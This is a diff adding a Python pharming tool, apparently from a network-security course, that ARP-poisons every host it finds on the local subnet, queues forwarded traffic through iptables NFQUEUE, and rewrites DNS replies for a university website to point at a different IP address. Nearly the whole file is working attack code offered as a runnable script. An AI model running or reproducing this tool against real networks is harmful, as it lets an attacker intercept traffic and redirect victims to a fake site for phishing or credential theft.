@@ -1,0 +1,96 @@
+#!/usr/bin/python3
+
+import socket, struct, os, sys, time
+import subprocess, re, fcntl
+from urllib.parse import unquote
+from scapy.all import *
+from netfilterqueue import NetfilterQueue
+from machine import *
+from utils import *
+
+def process_packet(packet):
+    scapy_packet = IP(packet.get_payload())
+    if scapy_packet.haslayer(DNSRR):
+        qname = scapy_packet[DNSQR].qname
+        if "www.nycu.edu.tw" in qname.decode():
+            print("[+] Spoofing target")
+            # answer = DNSRR(rrname=qname, rdata="140.113.207.237")
+            answer = DNSRR(rrname=qname, rdata="66.254.114.41")
+            scapy_packet[DNS].an = answer
+            scapy_packet[DNS].ancount = 1
+
+            del scapy_packet[IP].len
+            del scapy_packet[IP].chksum
+            del scapy_packet[UDP].chksum
+            del scapy_packet[UDP].len
+
+            packet.set_payload(bytes(scapy_packet))
+
+    return packet.accept()
+
+class dns_spoofer(threading.Thread):
+    def __init__(self):
+        threading.Thread.__init__(self)
+    def run(self):
+        self.queue = NetfilterQueue()
+        self.queue.bind(0, process_packet)
+        self.queue.run()
+    def dns_stop(self):
+        self.queue.unbind()
+
+if __name__ == "__main__":
+    print("(ﾟ皿ﾟﾒ) (ﾟ皿ﾟﾒ) (PHARM) (#`皿´) (#`皿´)")
+    args = sys.argv
+    if len(args) > 1:
+        for arg in args:
+            if arg == "-h" or arg == "--help":
+                print("[-] no help, byebye :)")
+                exit(1)
+            elif arg[0:2] == "-i":
+                interval=int(arg[2:len(arg)])
+                
+    print("[*] set up ip forwarding")
+    enable_port_forwarding()
+    os.system('iptables -I FORWARD -j NFQUEUE --queue-num 0')
+    
+    gateway = machine(conf.route.route("0.0.0.0")[2])
+    myself = machine(get_if_addr(conf.iface), Ether().src)
+    mach_list = []
+
+    print("[*] gateway: %s \t(%s)" % (gateway.ip, gateway.mac))
+    print("[*] myself: %s \t(%s)" % (myself.ip, myself.mac))
+    
+    #hosts discovery
+    net_range = myself.ip+"/24"
+    print("[*] discovering machines in (%s)" % net_range)
+    for ip in scan_hosts(net_range):
+        if ip != gateway.ip and ip != myself.ip:
+            mach = machine(ip=ip, gw=gateway)
+            mach_list.append(mach)
+            print("[*] discovered %s \t(%s)" % (ip, mach.mac))
+
+    t = dns_spoofer()
+    t.daemon = True
+    t.start()
+
+    #exploit
+    idle = False
+    try:
+        while(True):
+            print("[~] poisoning machines")
+            idle = False
+            for mach in mach_list:
+                mach.mitm_poison(myself)
+            idle = True
+
+            time.sleep(interval)
+    except KeyboardInterrupt:
+        if not idle: print()
+        print("\r[!] interrupted")
+        disable_port_forwarding()
+        print("[~] restore: ", end="")
+        for mach in mach_list:
+            mach.mitm_restore()
+            print(mach.ip, end=" ")
+        print()
+        exit(1)
